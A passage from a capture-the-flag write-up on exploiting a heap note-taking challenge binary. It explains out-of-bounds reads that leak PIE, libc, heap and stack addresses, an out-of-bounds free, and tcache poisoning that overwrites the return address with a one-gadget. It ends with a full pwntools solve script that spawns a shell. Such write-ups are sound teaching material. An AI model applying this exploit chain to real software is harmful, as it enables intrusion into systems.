    return res;
}

int main() {
    while (1) {
        printf("Menu\n");
        int i=0;
        for (auto &mi : menu) {
            printf("%d. %s\n", i+1, mi.name);
            i++;
        }

        printf("> ");
        fflush(stdout);

        unsigned int res;
        if (scanf("%u", &res) != 1) break;
        getchar(); // newline
        res -= 1;

        if (res < sizeof(menu) / sizeof(menu[0])) {
            long args[4];
            int argc = 0;
            while (menu[res].args[argc]) {
                printf("%s? > ", menu[res].args[argc]);
                fflush(stdout);
                args[argc++] = getnum();
            }
            menu[res].f(args[0], args[1], args[2], args[3]);
        } else break;
    }
}
```
:::



Right off the bat, we notice that there is a noticable OOB in the `read_note` function has no checks at all to the index other than the note pointer (`*content`) which can't be NULL.

```cpp=
void read_note(long note_id) {
    char **content = note_content_mut(note_id); // <- id isn't checked 
    if (*content == NULL) { 
        printf("Note does not exist :(\n");
        return;
    }

    printf("Note: %s\n", *content);
}
```
So from here we can practically do arbitrary read. Let's leak some values.

### Leaking Some Values

First, let's leak the PIE base address. We need this because calculating the index for OOB read (and eventually write) requires we know the address of the `notes` array in BSS.

```py=
# leak pie
read(-2)
leak = ex() 
exe.address = leak- 0x4060
logx.exe
# leak libc
read(-14)
leak = ex()
libc.address = leak - libc.sym['_IO_2_1_stdout_']
logx.libc
```

![image](https://hackmd.io/_uploads/BJksGZygWl.png)

For a heap leak, I made chunk go to an unsorted bin and then from LIBC's `main_arena` we could get the heap address.

```py=
# leak heap
heap_addr = libc.sym.main_arena + 128
read((heap_addr - exe.sym.notes ) // 0x10)
leak_heap = ex()
logx.leak_heap
```

![image](https://hackmd.io/_uploads/ByvDmWkxbl.png)

### Hidden Vuln

It turns out theres a vuln in the `**note_content_mut`. The bounds checking with `NUM_NOTES` doesn't actually work.

```cpp=
static inline char **note_content_mut(long note_id) {
    if (note_id < NUM_NOTES) return &notes[note_id].content;
    else return nullptr;
}
```
I don't know why this is the case but it means that we can just free whatever we want outside of the range.
### Exploit
For the exploit flow, I went with tcache poisoning. It's pretty easy to understand but in this case its kinda complicated because we need to leak the tcache key also.
First, I made a chunk that would act as the `notes` array but with fake structs.
```py=
pointers = create(0x500)
create(0x20)
delete(pointers)
```

I used this to leak stack addresses via LIBC's `environ`.


```py=
# leak stack
fake_id = ((leak_heap + 0x10) - exe.sym.notes )//0x10
fake_meta = p32(0x500) + p32(0)  
victim = create(0x100, p64(libc.sym.environ) + fake_meta)
read(fake_id)
stack = ex()
ret_addr = stack-0x130-0x8
modify(victim, 0x100, p64(ret_addr) + p32(0x500) + p32(0))
logx.stack, logx.ret_addr
```

Second, I made another chunk that would overlap and contain two fake chunks we need for tcache poisoning.

```py=
# make two fake chunks to do tcache poisoning
fake_chunks = flat(
    0, 0x21,
    0, 0, 
    0, 0x21,
    0, 0,
)

overlapping_chunk = create(0x400, fake_chunks)
```

In the `pointers` chunk, I placed pointers to the two fake chunks.

```py=
# put pointers 
first_chunk, second_chunk = leak_heap + 0x640, leak_heap + 0x660
fake_id = ((leak_heap + 0x10) - exe.sym.notes )//0x10
logx.fake_id

fake_struct_1 = flat(
    first_chunk, p32(0x500), p32(fake_id),
    second_chunk,p32(0x500), p32(fake_id+1),
)
modify(pointers, 0x500, fake_struct_1)
```

Put the chunks in tcache via OOB free.
```py= 
delete(fake_id + 1)
delete(fake_id)
```
As you can see we now have a chunk overlapping with tcache chunks.
![image](https://hackmd.io/_uploads/B1P68-kgZx.png)

Next, we leak the tcache key.
```py=
# leak tcache key
target_key = leak_heap + 0x648
fake_struct_2 = flat(
    target_key, p32(0x500), p32(fake_id),
)

modify(pointers, 0x500, fake_struct_2)
read(fake_id)
p.recvuntil(b'Note: ')
leak_key = ua(p.recv(8))
logx.leak_key

```

![image](https://hackmd.io/_uploads/r1rHDbygbl.png)

We can go on to modify the FD pointers in the tcache to point to the return address (at least before the return address because it needs to be aligned 16 bytes).
```py=
heap_aslr = leak_heap >> 12
logx.heap_aslr
tcache_poison = flat(
    0, 0x21,
    ret_addr ^ heap_aslr, leak_key,
    0, 0x21,
    heap_aslr, leak_key,
)

modify(overlapping_chunk, 0x400, tcache_poison)
```

Call `malloc` two times, the second `malloc` call will return a pointer to the stack.
To get shell, I overwrote the return address with a one gadget and then break the loop.

```py=
# get shell via one gadget
create(24, p64(leak_heap) + p64(libc.address+0xef52b))

# return to shell
p.sendline(b'123')
```
![image](https://hackmd.io/_uploads/Hk2QFbJg-g.png)


### Full Exploit

:::spoiler[solve.py]
```python=
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './chall_patched')

context.terminal = 'wt.exe wsl -d Ubuntu'.split()
context.arch = 'amd64'
context.log_level = 'debug' if args.DEBUG else 'info'
_, host, port = 'ncat iloverust.challs.pwnoh.io 1337'.split()

libc_path = './libc.so.6'
ld_path = './ld-linux-x86-64.so.2'
libc = ELF(libc_path) if libc_path else exe.libc
ld = ELF(ld_path) if ld_path else None

class LogAddressHex:
    def __getattribute__(self, name):
        try:
            resolved = eval(name)
        except:
            log.error(f'"{name}" doesn\'t exist')
            return lambda: ...
        
        if hasattr(resolved, 'address'):
            resolved = getattr(resolved, 'address')
            
            if not resolved & 0xfff:
                log.success(term.text.bold_green(f'{name}.address & 0xFFF == 0'))
            else:
                log.warn(term.text.bold_yellow(f'{name}.address & 0xFFF != 0'))
            
        log.info(term.text.blue(f'{name} : {resolved:#x}'))
        return lambda: ...

logx = LogAddressHex()

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    kw['env'] = {"SHELL": "/bin/sh"}
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port, ssl=True)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL or args.LOCAL_LIBC:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

def ua(x):
    return int.from_bytes(x, 'little')
INDEX = 0
def se(x):
    return str(x).encode()
def create(sz, x=b''):
    global INDEX
    p.sendline(b'1')
    p.sendline(se(sz))
    p.sendline(x)
    cur_idx = INDEX
    INDEX+=1
    return cur_idx
    
def read(idx):
    p.sendline(b'2')
    p.sendline(se(idx))

def modify(idx, sz, x=b''):
    p.sendline(b'3')
    p.sendline(se(idx))
    p.sendline(se(sz))
    p.sendline(x)
def delete(idx):
    global INDEX
    p.sendline(b'4')
    p.sendline(se(idx))
    cur_idx = INDEX
    INDEX-=1
    return cur_idx


gdbscript = '''

brva 0x00000000000013b3
continue
'''.format(**locals())

def ex():
    p.recvuntil(b'Note: ')
    leak = ua(p.recvline().rstrip())
    return leak
    
p = start()

# leak pie
read(-2)
leak = ex() 
exe.address = leak- 0x4060
logx.exe
# leak libc
read(-14)
leak = ex()
libc.address = leak - libc.sym['_IO_2_1_stdout_']
logx.libc

pointers = create(0x500)
create(0x20)
delete(pointers)


# leak heap
heap_addr = libc.sym.main_arena + 128
read((heap_addr - exe.sym.notes ) // 0x10)
leak_heap = ex()
logx.leak_heap

# leak stack
fake_id = ((leak_heap + 0x10) - exe.sym.notes )//0x10
fake_meta = p32(0x500) + p32(0)  
victim = create(0x100, p64(libc.sym.environ) + fake_meta)
read(fake_id)
stack = ex()
ret_addr = stack-0x130-0x8
modify(victim, 0x100, p64(ret_addr) + p32(0x500) + p32(0))
logx.stack, logx.ret_addr

# make two fake chunks to do tcache poisoning
fake_chunks = flat(
    0, 0x21,
    0, 0, 
    0, 0x21,
    0, 0,
)

overlapping_chunk = create(0x400, fake_chunks)

# put pointers 
first_chunk, second_chunk = leak_heap + 0x640, leak_heap + 0x660
fake_id = ((leak_heap + 0x10) - exe.sym.notes )//0x10
logx.fake_id

fake_struct_1 = flat(
    first_chunk, p32(0x500), p32(fake_id),
    second_chunk,p32(0x500), p32(fake_id+1),
)
modify(pointers, 0x500, fake_struct_1)
delete(fake_id + 1)
delete(fake_id)


# leak tcache key
target_key = leak_heap + 0x648
fake_struct_2 = flat(
    target_key, p32(0x500), p32(fake_id),
)

modify(pointers, 0x500, fake_struct_2)
read(fake_id)
p.recvuntil(b'Note: ')
leak_key = ua(p.recv(8))
logx.leak_key

heap_aslr = leak_heap >> 12
logx.heap_aslr
tcache_poison = flat(
    0, 0x21,
    ret_addr ^ heap_aslr, leak_key,
    0, 0x21,
    heap_aslr, leak_key,
)

modify(overlapping_chunk, 0x400, tcache_poison)
create(24)

# get shell via one gadget
create(24, p64(leak_heap) + p64(libc.address+0xef52b))

# return to shell
p.sendline(b'123')

p.interactive()
```

:::
